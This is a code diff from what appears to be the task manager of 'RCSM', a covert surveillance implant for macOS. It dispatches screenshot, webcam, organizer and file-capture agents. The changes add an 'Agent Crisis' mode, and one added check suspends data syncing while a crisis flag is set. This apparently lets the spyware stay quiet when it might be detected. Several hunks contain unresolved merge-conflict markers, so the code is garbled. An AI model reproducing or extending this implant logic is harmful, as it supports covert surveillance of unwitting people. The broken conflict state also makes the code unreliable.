@@ -13,6 +13,7 @@
 #import <sys/ipc.h>
 #import <sys/ioctl.h>
 
+#import "RCSMCommon.h"
 #import "RCSMAgentScreenshot.h"
 #import "RCSMAgentWebcam.h"
 #import "RCSMAgentOrganizer.h"
@@ -1184,6 +1185,7 @@ static NSLock *gSyncLock                  = nil;
           }
         break;
       }
+<<<<<<< Updated upstream
     case AGENT_FILECAPTURE:
       {
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -1259,6 +1261,15 @@ static NSLock *gSyncLock                  = nil;
 #endif
               }
           }
+=======
+    case AGENT_CRISIS:
+      {
+#ifdef DEBUG_TASK_MANAGER
+        NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
+#endif
+        gAgentCrisis |= CRISIS_START;
+      
+>>>>>>> Stashed changes
         break;
       }
     default:
@@ -1654,6 +1665,15 @@ static NSLock *gSyncLock                  = nil;
             agentConfiguration = [self getConfigForAgent: agentID];
             [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
           }
+        break;
+      }
+    case AGENT_CRISIS:
+      {
+#ifdef DEBUG_TASK_MANAGER
+        NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
+#endif
+        gAgentCrisis &= ~CRISIS_STARTSTOP;
+        
         break;
       }
     default:
@@ -2224,6 +2244,7 @@ static NSLock *gSyncLock                  = nil;
                                 
                 break;
               }
+<<<<<<< Updated upstream
             case AGENT_FILECAPTURE_OPEN:
               {
 #ifdef DEBUG_TASK_MANAGER
@@ -2299,6 +2320,15 @@ static NSLock *gSyncLock                  = nil;
 #endif
                       }
                   }
+=======
+            case AGENT_CRISIS:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
+#endif
+                gAgentCrisis |= CRISIS_START;                
+                
+>>>>>>> Stashed changes
                 break;
               }
             default:
@@ -2663,6 +2693,15 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
+            case AGENT_CRISIS:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
+#endif
+                gAgentCrisis &= ~CRISIS_STARTSTOP;
+                
+                break;
+              }
             default:
               break;
             }
@@ -2814,8 +2853,9 @@ static NSLock *gSyncLock                  = nil;
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
 #ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Triggering action: %d", anActionID);
+  infoLog(@"Triggering action no. %d", anActionID);
 #endif
+  
   BOOL _isSyncing = NO;
   int waitCounter = 0;
   
@@ -2837,6 +2877,18 @@ static NSLock *gSyncLock                  = nil;
     {
     case ACTION_SYNC:
       {
+        if ((gAgentCrisis & CRISIS_START) && (gAgentCrisis & CRISIS_SYNC))
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"CRISIS_SYNC actived do not sync");
+#endif
+          break;
+        }  
+        
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"syncing");
+#endif
+        
         [gSyncLock lock];
         _isSyncing = mIsSyncing;
         [gSyncLock unlock];
